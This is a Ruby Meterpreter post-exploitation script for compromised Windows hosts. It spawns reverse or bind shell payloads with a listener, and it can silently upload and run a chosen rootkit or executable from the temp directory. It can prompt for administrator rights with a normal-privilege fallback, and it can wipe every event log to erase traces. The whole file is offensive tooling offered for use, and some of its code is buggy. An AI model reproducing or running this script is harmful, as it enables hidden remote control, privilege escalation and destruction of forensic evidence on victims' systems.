#Author : Hugo Math

opts = Rex::Parser::Arguments.new(

"-h" => [false,"This help menu"],
"-cp"=> [true,"Local payload to use (not necessary )ex : /root/Desktop/payload.exe "],
"-p" => [true ,"The port to use (default is 433) "],
"-ip" => [true ,"The ip for the connection back"],
"-c" => [true ,"Choose specific payload (default is 1):\n
     [  1 :  meterpreter_reverse_tcp      ]
     [  2 :  meterpreter_reverse_http     ]
     [  3 :  meterpreter_bind_tcp         ]
     [  4 :  meterpreter_bind_hidden_tcp  ]
     [  5 :  shell_reverse_tcp            ]
     [  6 :  shell_reverse_http           ]
     [  7 :  shell_bind_tcp               ]
     [  8 :  shell_bind_hidden_tcp        ]\n"
],
"-r" => [true,"Upload a rootkit or a simply exe on the current session, you must indicate the location of it ( ex : /root/rootkit.exe )"],
"-a" =>[false,"Execute the payload or the exe as administrator"],
"-au"=>[false,"Enable the auto retry in normal privs if the admin ask failed"],
"-l" =>[false,"Enable auto clear logs "],
"-n" =>[true,"Use a custom name for the payload or the rootkit(nothing.exe ), useful if you want to try the admin ask, default is a random name )"]
)


##################VARIABLES##################


lpayload = ""

exe = ""

clear_logs = 0

auto = 0

administrator = 0

nopayload = 0

payload = "windows/meterpreter/reverse_tcp"

usage = "Meterpreter Script to duplicate custom session in Admin or in normal privs, it can also upload and execute an exe file in admin or not."

filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

rhost = Rex::Socket.source_address("1.2.3.4")

rport = 433

lhost = "127.0.0.1"

pay = nil

################ARGS#####################

opts.parse(args) do | opt,idx,val|

	case opt

	when "-h"
	print_good(usage)
	print_status(opts.usage)
	raise Rex::Script::Completed

	when "-ip"
	rhost = val
	
	when "-p"
	rport = val.to_i
	when "-c"
	payload = val
	case payload
	  when "1"
	    payload = "windows/meterpreter/reverse_tcp"	
  	  when "2"
	    payload = "windows/meterpreter/reverse_http"
	  when "3"
	    payload = "windows/meterpreter/bind_tcp"
	  when "4"
	    payload = "windows/meterpreter/bin_hidden_tcp"
	  when "5"
	    payload = "windows/shell/reverse_tcp"
	  when "6"
	    payload = "windows/shell/reverse_http"
	  when "7"
	    payload = "windows/shell/bind_tcp"
	  when "8"
	    payload = "windows/shell/bind_hidden_tcp"
	end       
	when "-r"
	nopayload = 1
	exe = val
	when "-a"
	administrator = 1
	when "-au"
	auto = 1
	when "-l"
	clear_logs = 1
	when "-e"
	target = val
	when "-cp"
	lpayload = val
	when"-n"
	filename = val
  end 
end

#######################PAYLOAD_FONCTION################

def creat_payload(rhost,rport,payload,
filename,lpayload)

begin

if client.platform = "x86/win32" || "x64/win64/" || "/win64" || "win32"

if lpayload == ""

pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
mul = client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOneSession'] = true
print_status("Running payload handler")
mul.exploit_simple(
'Payload' => mul.datastore['PAYLOAD'],
'RunAsJob' => true

)

print_good("The Target is running on : #{client.platform} ")

  
	tempdir = client.fs.file.expand_path("%TEMP%")
	print_status("Uploading payload to temp directory")
	 raw = pay.generate
	 exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
	tempexe = tempdir + "\\" + filename
	 tempexe.gsub!("\\\\", "\\")
	fd = client.fs.file.new(tempexe, "wb")
	fd.write(exe)
	fd.close
	print_good("Done..")
	print_status("Executing the payload on the system")
	execute_payload = "#{tempdir}\\#{filename}"
	pid = session.sys.process.execute(execute_payload,nil,{'Hidden' => true})
	print_good("Done ..")
   

else

ans = ""
print_status("WARNING, you have selected custom payload")
print_status("You have to run a propely multi/handler in an other msfconsole ")
print_status("The script can't know the custom payload to listen")
print_status("Do you want to continue ? (O/N)")
ans = gets

if ans == "O"

	local = session.sys.config.getenv('TEMP')
	fileexe = "#{local}\\#{filename}"
	print_status ("Uploading exe file ...")
	session.fs.file.upload_file("#{fileexe}","#{lpayload}")
	print_good("Payload uploaded..")
	print_status("Uploaded in #{fileexe}")
	print_status("file name : #{filename}")

	pid = session.sys.process.execute(fileexe,nil,{'Hidden' => true })
	print_good("Custom payload executed with succes ! ")
end
end

else
     print_error("Platform not supported")
end


   rescue ::Exception => e

print_error("The following error was find : #{e}")
   end
end


##################ROOTKIT/EXE#######################

def rootkit_exe(exe,
filename)
begin
	local = session.sys.config.getenv('TEMP')
	fileexe = "#{local}\\#{filename}"
	print_status ("Uploading exe file ...")
	session.fs.file.upload_file("#{fileexe}","#{exe}")
	print_good("Rootkit uploaded..")
	print_status("Uploaded in #{fileexe}")
	pid = session.sys.process.execute(exe,nil,{'Hidden' => true })
	print_good("Custom rootkit executed with succes ! ")

   rescue ::Exception => e 
	print_error("The following error was find : #{e}")
	print_error("The rootkit couldn't be execute ")
   end
end

#######################ADMIN-PAYLOAD###################

def admin_payload(rhost,rport,payload,
filename,auto,lpayload)


begin

if client.platform = "x86/win32" || "x64/win64/" || "/win64" || "win32"

if lpayload == ""

print_status("Starting admin_payload...")
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
mul = client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOneSession'] = true
print_status("Running payload handler")
mul.exploit_simple(
'Payload' => mul.datastore['PAYLOAD'],
'RunAsJob' => true
)

print_good("The Target is running on : #{client.platform} ")

	
	tempdir = client.fs.file.expand_path("%TEMP%")
	print_status("Uploading payload to temp directory")
	 raw = pay.generate
	 exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
	tempexe = tempdir + "\\" + filename
	 tempexe.gsub!("\\\\", "\\")
	fd = client.fs.file.new(tempexe, "wb")
	fd.write(exe)
	fd.close
	print_status("Executing the payload on the system")
	execute_payload = "#{tempdir}\\#{filename}"
	print_status("If the admin ask failed, a new payload will spawn in normal privs")
	session.railgun.shell32.ShellExecuteA(nil,"runas",execute_payload,nil,nil,5)
	print_good("Done ..")


else

print_status("WARNING, you have selected custom payload")
print_status("You have to run a propely multi/handler in an other msfconsole ")
print_status("The script can't know the custom payload to listen")
print_status("You have 30 seconds to creat the exploit ")
time = 30
while ( time > 0 ) do 
	print_status("#{time}")
	time = time - 1
	sleep 1
end	

	
	local = session.sys.config.getenv('TEMP')
	fileexe = "#{local}\\#{filename}"
	print_status ("Uploading exe file ...")
	session.fs.file.upload_file("#{fileexe}","#{lpayload}")
	print_good("Payload uploaded..")
	print_status("Uploaded in #{fileexe}")
	pid = session.railgun.shell32.ShellExecuteA(nil,"runas",fileexe,nil,nil,5)
	print_good("Custom payload executed with succes ! ")
end

 else
	print_error("Platform not supported")
end

   rescue ::Exception => e
	print_error("The following error was find : #{e}")
	if auto == 1
	print_good("Admin Ask failed, starting payload in normal mode ..")
	creat_payload(rhost,rport,payload,
filename,lpayload)
	end	
   end
end

###################ROOTKIT-ADMIN#################

def admin_rootkit_exe(exe,
filename,auto)

begin
	print_status("Starting admin rootkit ..")
local = session.sys.config.getenv('TEMP')
	fileexe = "#{local}\\#{filename}"
	print_status ("Uploading exe file ...")
	session.fs.file.upload_file("#{fileexe}","#{exe}")
	print_good("Rootkit uploaded..")
	print_status("Uploaded in #{fileexe}")
	print_status("Waiting for the user ..")
	session.railgun.shell32.ShellExecuteA(nil,"runas",fileexe,nil,nil,5)
	print_good("Custom rootkit executed with admin privs ! ")


   rescue ::Exception => e

	print_error("The following error was find : #{e}")
	if auto == 1
	print_good("Admin Ask failed, starting rootkit in normal mode ..")
	rootkit_exe(exe,filename,auto)
	end
   end
end

#################CLEARLOG##############################

def clear(session)
  	print_status("\n")
	print_status("Starting the auto clear log ...")
	sleep 1
        print_status("You must have an root acces ")
	
	
    print_status("Clearing Event Logs ")

    begin
        eventlog_list.each do |evl|

            print_status("Clearing the #{evl} Event Log")
            log = session.sys.eventlog.open(evl)
            print_status("#{log.clear}")
	    print_good("Done..")

        end

        print_good("All Event Logs have been cleared")

    rescue ::Exception => e
        print_error("Error clearing Event Log: #{e.class} #{e}")

    end
end

##################FINAL-CONDITION######################


if nopayload == 0 && administrator == 1

admin_payload(rhost,rport,payload,
filename,auto,lpayload)
if clear_logs == 1
clear(client)
end

elsif nopayload == 1 && administrator == 0
rootkit_exe(exe,
filename)
if clear_logs == 1
clear(client)
end

elsif nopayload == 1 && administrator == 1
admin_rootkit_exe(exe,
filename,auto)
if clear_logs == 1
clear(client)
end

else 
creat_payload(rhost,rport,payload,
filename,lpayload)
if clear_logs == 1
clear(client)
end

end

